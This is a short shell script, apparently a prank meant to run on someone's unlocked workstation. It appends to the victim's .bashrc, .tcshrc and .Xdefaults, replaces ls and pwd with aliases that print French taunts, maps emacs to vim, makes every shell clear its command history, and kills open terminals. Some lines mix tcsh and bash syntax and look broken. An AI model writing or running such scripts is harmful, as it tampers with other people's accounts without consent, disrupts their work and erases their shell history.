#!/bin/sh
echo "set prompt='%{[\033[1;5;35mJE DOIS ME LOCK OU JE VAIS ME FAIRE BIZUTER\033[0m%}] '" >> /home/${USER}/.bashrc;
echo "source ${HOME}/.bashrc" >> /home/${USER}/.tcshrc
echo "xterm*background: yellow" >> /home/${USER}/.Xdefaults
echo "alias ls='echo \"JE DOIS ME LOCK\"'" >> /home/${USER}/.bashrc
echo "alias pwd='echo \"ZLOCK C EST PAS COMPLIQUE NAN ??\"'" >> /home/${USER}/.bashrc;
echo "alias emacs=vim" >> /home/${USER}/.bashrc;
echo "history -c;" >> /home/${USER}/.bashrc;
pkill terminal;
